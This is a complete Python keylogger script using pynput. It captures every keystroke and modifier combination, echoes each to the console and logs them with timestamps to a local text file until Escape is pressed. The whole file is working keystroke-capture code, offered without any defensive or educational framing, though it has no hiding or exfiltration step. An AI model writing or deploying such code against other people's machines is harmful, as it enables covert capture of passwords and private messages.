import pynput
from pynput.keyboard import Key, Listener
import logging

# Define the location of the keylog
keylogger_filename = r"keylogger.txt"
# Define the format of the keylog
logging.basicConfig(filename=keylogger_filename, level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Track the state of modifier keys
modifier_keys = {
    Key.ctrl_l: False,
    Key.ctrl_r: False,
    Key.shift: False,
    Key.alt: False
}

# Log the key that was pressed
def on_press(key):
    # Exit the program if escape key is pressed
    if key == Key.esc:
        return False

    if key in modifier_keys:
        modifier_keys[key] = True
    elif any(modifier_keys.values()):
        active_modifiers = [str(k) for k, v in modifier_keys.items() if v]
        found_modifier = active_modifiers[0] if active_modifiers else ""
        print(f"Combination pressed: {found_modifier} + {key}")
        logging.info(str(found_modifier) + ", " + str(key))
        reset_modifiers()
    else:
        print(f"Single key pressed: {key}")
        logging.info(str(key))

def reset_modifiers():
    for key in modifier_keys:
        modifier_keys[key] = False

# Listen for keyboard events and call on_keypress whenever a key is stepped
with Listener(on_press=on_press) as listener:
    # Keep the program running until it is stopped
    listener.join()